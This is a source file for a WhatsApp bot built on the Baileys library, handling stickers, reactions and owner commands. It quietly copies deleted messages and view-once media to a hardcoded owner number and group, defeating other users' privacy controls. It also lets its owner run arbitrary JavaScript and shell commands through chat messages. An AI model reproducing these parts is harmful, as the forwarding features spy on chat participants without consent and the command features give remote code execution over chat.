
require('./config')
const baileys = require("@adiwajshing/baileys")
const { Presence, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const rzky = require("ikyy")
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const first = moment()
const hx = require("hxz-api")
const cron = require('node-cron')
const deepai = require("deepai")
deepai.setApiKey('quickstart-QUdJIGlzIGNvbWluZy4uLi4K');
const primbon = new Primbon()
const { unixTimestampSeconds, smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, sleep, formatp, format, bytesToSize } = require('./lib/myfunc')

module.exports = puki = async (puki, m, chatUpdate, store) => {
    try {
    	puki.ev.on('message-delete', async (m) => {
    puki.sendMessage("66285793432434-1618061428@g.us", `Terdeteksi, @${m.participant.split("@")[0]} Telah Menghapus Pesan`, MessageType.text, {quoted: m, contextInfo: {"mentionedJid": [m.participant]}})
      puki.copyNForward("6285793432434@s.whatsapp.net", m.message).catch(e => console.log(e, m))
    console.log(m.message)
    })
const time = moment.tz('Asia/Jakarta').format('HH:mm:ss')
    	const from = m.key.remoteJid
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        const type = Object.keys(m.message)[0]        
                const cmd = (type === 'conversation' && m.message.conversation) ? m.message.conversation : (type == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (type == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (type == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
                   const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '/'         
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await puki.decodeJid(puki.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
	    const isMedia = /image|video|sticker|audio/.test(mime)
	const oner = "6285793432434-1618061428@g.us"
        // Group
        const groupMetadata = m.isGroup ? await puki.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	
    
    if (m.mtype == 'viewOnceMessage'){
            message = {...m}
            message.message = m.message.viewOnceMessage.message
            message.message[Object.keys(message.message)[0]].viewOnce = false
            m.reply('ViewOnce detected!', oner).then(() => puki.copyNForward(oner, message))
}


        // Public & Self
        if (!puki.public) {
            if (!m.key.fromMe) return
        }

        // Push Message To Console && Auto Read
        if (m.message) {
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat)+ '\n' + chalk.magenta('=> Key'), chalk.green(m.id), chalk.yellow(m.key))
        }
	
	// write database every 1 minute
	setInterval(() => {
            fs.writeFileSync('./src/database.json', JSON.stringify(global.db, null, 2))
        }, 60 * 1000)

	    
function pickRandom(arr) {
    return arr[Math.floor(Math.random() * arr.length)]
}
    const reply = (teks) => {
            puki.sendMessage(from, { text: teks, quoted:m})
        }
	    const sendHidetag = async function(id, message) {
					const gcx = await puki.groupMetadata(id)
					const mememl = gcx['participants']
					const memelx = []
					mememl.map( async adm => {
					memelx.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					const bslx = {
					text: message,
					contextInfo: { mentionedJid: memelx }
					}
					puki.sendMessage(id, bslx)
					}

	
if (cmd === ("q")) {
    if (!m.quoted) return
    let rii = puki.serializeM(await m.getQuotedObj())
    if (!rii.quoted) return
    await rii.quoted.copyNForward(m.chat, true)
    }  
    if (cmd === ("@6285793432434")){
    	puki.sendMessage(m.chat, {
            sticker: {
                url: './lib/s.webp'
            }},
            {quoted: m}
)
    	}
        switch(command) {
        	case 'react': case 'r': {
	    var qes = args.join(' ')
	var { key: hh } = m.quoted ? m.quoted.fakeObj: m
await puki.relayMessage(m.chat, {
reactionMessage: {
key: hh,
text: qes,
senderTimestampMs: m.messageTimestamp
}}, { messageId: m.id })
///await m.reply(`Done!\n{\n   reactions: "${qes}",\n   id: ${m.id},\n   TimeStamp: ${m.messageTimestamp}\n}`)
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
           if (/image/.test(mime)) {
           m.reply(mess.wait)
                let media = await puki.downloadMediaMessage(qmsg)
                let encmedia = await puki.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
            m.reply(mess.wait)
                if (qmsg.seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await puki.downloadMediaMessage(qmsg)
                let encmedia = await puki.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                return 
                }
            }
            break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return 
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return 
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                	m.reply('Executing...')
                    if (!isCreator) return 
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
		if (isCmd && budy.toLowerCase() != undefined) {
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    puki.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
       
    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
